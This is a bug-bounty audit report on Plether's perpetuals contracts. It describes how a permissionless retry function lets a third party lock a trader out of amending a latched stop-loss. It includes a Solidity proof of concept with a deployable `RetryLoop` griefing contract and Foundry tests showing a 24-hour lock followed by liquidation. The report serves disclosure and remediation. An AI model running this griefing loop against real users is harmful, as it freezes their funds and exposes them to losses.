# \#98010 [SC-High] Permissionless retry can stop a trader from amending the close limits of a latched protection

**Submitted on Nov 4th 2026 at 11:28:51 UTC by @Rareone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98010
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Temporary freezing of funds for at least 1 hour

## Description

## Summary

When a stop loss fires and its close order fails on the trader's own limits, the protection goes to `Latched`. The docs give the trader one fix: raise the limits with `amendLatchedPositionProtectionCloseLimits`, then retry.

That function only works while the protection is `Latched` and the account has no pending order. But `retryPositionProtectionClose` can be called by anyone, at any time, and it moves the protection back to `Triggered` with a new pending order. In `Triggered` the trader has no action available at all.

So a third party can keep a contract running that clears the dead order and retries in the same transaction, about once a minute. The protection is then never `Latched` at a transaction boundary, and the trader cannot change the limits that are keeping the position open. In the PoC this holds for 24 hours, and the trader ends up liquidated instead of closing at the price she was willing to accept.



## Vulnerability details

Amending needs `Latched` and an empty queue:

```solidity
// PositionProtectionBook.sol:315
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
```

Retry has no caller check and no delay, and it uses `_activeProtection` rather than the owned version:

```solidity
// PositionProtectionBook.sol:382
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
```

Once it has run, these all revert for the owner:

| Action | Revert |
|---|---|
| `amendLatchedPositionProtectionCloseLimits` | `ProtectionNotLatched` |
| `cancelPositionProtection` | `ProtectionNotArmed` |
| `cancelPositionProtectionAndCommitClose` | `ProtectionNotArmed` |
| `commitOrder` (a normal close) | `ProtectionActive` (`OrderLiquidationBatchLogic.sol:314`) |

The new order can't succeed either, because it carries the same limits that failed. It sits until its deadline. Clearing it after that needs no oracle data, so the griefer pays gas and nothing else. Clearing and retrying fit in one transaction, which is why no gap opens up for the owner.

---

## Attack scenario

1. Alice opens a 10,000 token position at 1.00 with 2,000 USDG margin. She sets a stop at 1.10 and a gross debit ceiling of 1,100 USDG, which is her expected 1,000 USDG loss plus 10%.
2. The price gaps through the stop to 1.15. A keeper triggers the protection and the close fails with `ConstraintViolation`, since the debit is now over her ceiling. The protection is `Latched`.
3. Before she amends, the griefer calls retry. The protection is `Triggered`.
4. When the order's 60 second window ends, the griefer's contract clears it and retries in one transaction. It repeats this for as long as it wants.
5. Alice can't amend, cancel or close. If the price keeps moving against her she is liquidated.

### Cost

About 1,400 transactions a day, gas only. There is no oracle fee and no capital at risk. The griefer doesn't profit directly, so the likely motive is hurting a specific trader or holding a counterparty position against them.

---

## Impact

Measured in the PoC at release risk parameters:

- Without the griefer, Alice raises her limit and exits at 1.15 with **18,491.20 USDG**.
- With the griefer, she is still locked after 24 hours (1,418 cycles over 86,437 seconds), with 1,985.50 USDG of margin still in the position.
- If the price then reaches 1.201 she is liquidated and ends with **17,999.80 USDG**, which is 491.40 USDG worse.

The 491.40 USDG depends on that price path and on Alice not adding margin. It does not go to the griefer.


## Recommendation

Let the owner amend and retry in one call, for example `amendLatchedCloseLimitsAndRetry`, and also allow it while `Triggered` once the live child is past its deadline, clearing that child first. That way the griefer has nothing to race against.

A short owner-only window after a relatch, during which only the owner can retry, would also work, but it delays the close for traders who aren't being griefed.

## Proof of Concept

## Proof of Concept

## Proof of concept

Place the file at `packages/perps/test/perps/security/LatchedProtectionRetryLockPoC.t.sol` and run:

```
forge test --match-path test/perps/security/LatchedProtectionRetryLockPoC.t.sol --gas-limit 30000000000 -vv
```

The higher gas limit is only needed because the 24 hour loop runs inside one test.

```
[PASS] test_Control_OwnerAmendsAndExits()
  Alice balance after exit at 1.15: 18491200000
[PASS] test_OwnerAddsMarginDuringLock()
  margin before: 1985500999
  margin after: 2985500999
  size after 1.201 liquidation attempt: 10000000000000000000000
[PASS] test_OwnerEscapes_IfExpireAndAmendAreAdjacent()
[PASS] test_RetryLoop_BlocksOwnerFor24h()
  cycles: 1418
  elapsed seconds: 86437
  margin still in the position: 1985500999
[PASS] test_RetryLoop_ThenLiquidated()
  Alice balance after liquidation at 1.201: 17999800000
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IRouterExecute {

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

/// Anyone can deploy this. It clears the expired child and appends a new one in a single transaction,
/// so the protection is never Latched at a transaction boundary.
contract RetryLoop {

    IRouterExecute internal immutable ROUTER;
    IPositionProtectionActions internal immutable ACTIONS;
    IPositionProtectionViews internal immutable VIEWS;
    uint256 public cycles;

    constructor(
        address router_,
        address book_
    ) {
        ROUTER = IRouterExecute(router_);
        ACTIONS = IPositionProtectionActions(book_);
        VIEWS = IPositionProtectionViews(book_);
    }

    function retryNow(
        uint64 protectionId
    ) external {
        ACTIONS.retryPositionProtectionClose(protectionId);
        ++cycles;
    }

    function cycle(
        uint64 protectionId
    ) external {
        ROUTER.executeOrder(VIEWS.getPositionProtection(protectionId).linkedOrderId, new bytes[](0));
        ACTIONS.retryPositionProtectionClose(protectionId);
        ++cycles;
    }

}

contract LatchedProtectionRetryLockPoC is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0x7106);

    uint256 internal constant MARK = 1e8;
    uint256 internal constant SIZE = 10_000e18;
    uint256 internal constant MARGIN = 2000e6;
    uint256 internal constant STOP = 110_000_000;
    uint256 internal constant GAP = 115_000_000;

    IPositionProtectionActions internal actions;
    IPositionProtectionViews internal views;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));
        _fundTrader(ALICE, 20_000e6);
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_live(MARK));
    }

    function _live(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _status(
        uint64 id
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return views.getPositionProtection(id).status;
    }

    /// Alice opens a 10k position and sets a stop at 1.10 with a debit ceiling of the expected loss plus 10%.
    function _armStop() internal returns (uint64 id) {
        _open(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, MARK);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: 1100e6,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ALICE);
        id = actions.createPositionProtection(params);
    }

    /// The price gaps through the stop to 1.15. The child fails on Alice's ceiling and the protection latches.
    function _gapAndFail(
        uint64 id
    ) internal {
        _mockPythUpdateData(GAP);
        vm.prank(KEEPER);
        uint64 child = actions.triggerPositionProtection(id, _live(GAP));
        bytes[] memory data = _mockPythUpdateData(GAP);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
    }

    function _noLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l.maxExecutionNotionalAssets = type(uint256).max;
        l.maxGrossAccountDebitAssets = type(uint256).max;
        l.maxActionChargeAssets = type(uint256).max;
        l.maxExplicitFeesAssets = type(uint256).max;
    }

    function _closeRequest(
        bytes32 clientOrderId
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientOrderId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = SIZE;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _assertOwnerCannotAct(
        uint64 id,
        uint256 salt
    ) internal {
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        actions.amendLatchedPositionProtectionCloseLimits(id, _noLimits());

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtection(id);

        OrderV3Types.OrderRequest memory request = _closeRequest(keccak256(abi.encode("close", salt)));
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(request);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        actions.cancelPositionProtectionAndCommitClose(id, request);
    }

    /// Baseline: nobody interferes, Alice raises her ceiling, the retry closes her position.
    function test_Control_OwnerAmendsAndExits() public {
        uint64 id = _armStop();
        _gapAndFail(id);
        vm.prank(ALICE);
        actions.amendLatchedPositionProtectionCloseLimits(id, _noLimits());
        uint64 child = actions.retryPositionProtectionClose(id);
        bytes[] memory data = _mockPythUpdateData(GAP);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0);
        emit log_named_uint("Alice balance after exit at 1.15", clearinghouse.balanceAssets(ALICE));
    }

    /// With the loop running, no owner action is available at any transaction boundary for 24h.
    function test_RetryLoop_BlocksOwnerFor24h() public {
        uint64 id = _armStop();
        _gapAndFail(id);
        RetryLoop loop = new RetryLoop(address(router), address(actions));
        loop.retryNow(id);
        _assertOwnerCannotAct(id, 0);

        uint256 start = vm.getBlockTimestamp();
        uint256 i;
        while (vm.getBlockTimestamp() < start + 24 hours + 1) {
            uint64 live = views.getPositionProtection(id).linkedOrderId;
            vm.warp(uint256(router.lifecycleBook().orderTiming(live).executionDeadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            loop.cycle(id);
            assertEq(router.pendingOrderCounts(ALICE), 1);
            assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            if (i % 240 == 0) {
                _assertOwnerCannotAct(id, 100 + i);
            }
            ++i;
        }
        _assertOwnerCannotAct(id, type(uint64).max);
        (uint256 size, uint256 margin,,,,,) = engine.positions(ALICE);
        assertEq(size, SIZE);
        emit log_named_uint("cycles", loop.cycles());
        emit log_named_uint("elapsed seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("margin still in the position", margin);
    }

    /// Same lock, then the price keeps moving against her and she is liquidated instead of exiting at 1.15.
    function test_RetryLoop_ThenLiquidated() public {
        uint64 id = _armStop();
        _gapAndFail(id);
        RetryLoop loop = new RetryLoop(address(router), address(actions));
        loop.retryNow(id);
        for (uint256 k; k < 20; ++k) {
            uint64 live = views.getPositionProtection(id).linkedOrderId;
            vm.warp(uint256(router.lifecycleBook().orderTiming(live).executionDeadline) + 1);
            loop.cycle(id);
            _assertOwnerCannotAct(id, 1000 + k);
        }
        uint256 price = 120_100_000;
        _mockPythUpdateData(price);
        bytes[] memory data = _live(price);
        vm.prank(KEEPER);
        router.executeLiquidation(ALICE, data);
        (uint256 size,,,,,,) = engine.positions(ALICE);
        assertEq(size, 0);
        emit log_named_uint("Alice balance after liquidation at 1.201", clearinghouse.balanceAssets(ALICE));
    }

    /// Adding margin during the lock, then the same 1.201 move that liquidates her in test_RetryLoop_ThenLiquidated.
    function test_OwnerAddsMarginDuringLock() public {
        uint64 id = _armStop();
        _gapAndFail(id);
        RetryLoop loop = new RetryLoop(address(router), address(actions));
        loop.retryNow(id);
        _assertOwnerCannotAct(id, 0);
        (, uint256 before,,,,,) = engine.positions(ALICE);
        vm.prank(ALICE);
        engine.addMargin(ALICE, 1000e6);
        (, uint256 afterMargin,,,,,) = engine.positions(ALICE);
        assertEq(afterMargin, before + 1000e6, "margin added during the lock");
        emit log_named_uint("margin before", before);
        emit log_named_uint("margin after", afterMargin);

        for (uint256 k; k < 20; ++k) {
            uint64 live = views.getPositionProtection(id).linkedOrderId;
            vm.warp(uint256(router.lifecycleBook().orderTiming(live).executionDeadline) + 1);
            loop.cycle(id);
        }
        uint256 price = 120_100_000;
        _mockPythUpdateData(price);
        bytes[] memory data = _live(price);
        vm.prank(KEEPER);
        try router.executeLiquidation(ALICE, data) {
            emit log("liquidation call did not revert");
        } catch (bytes memory reason) {
            emit log_named_bytes("liquidation reverted", reason);
        }
        (uint256 size, uint256 marginEnd,,,,,) = engine.positions(ALICE);
        emit log_named_uint("size after 1.201 liquidation attempt", size);
        emit log_named_uint("margin after 1.201 liquidation attempt", marginEnd);
        emit log_named_uint("Alice balance", clearinghouse.balanceAssets(ALICE));
        emit log_named_uint("protection status", uint8(_status(id)));
    }

    /// If nothing lands between Alice's expire and her amend, she gets out.
    function test_OwnerEscapes_IfExpireAndAmendAreAdjacent() public {
        uint64 id = _armStop();
        _gapAndFail(id);
        RetryLoop loop = new RetryLoop(address(router), address(actions));
        loop.retryNow(id);
        uint64 live = views.getPositionProtection(id).linkedOrderId;
        vm.warp(uint256(router.lifecycleBook().orderTiming(live).executionDeadline) + 1);
        vm.prank(ALICE);
        router.executeOrder(live, new bytes[](0));
        vm.prank(ALICE);
        actions.amendLatchedPositionProtectionCloseLimits(id, _noLimits());
        assertEq(uint8(_status(id)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));
    }

}
```
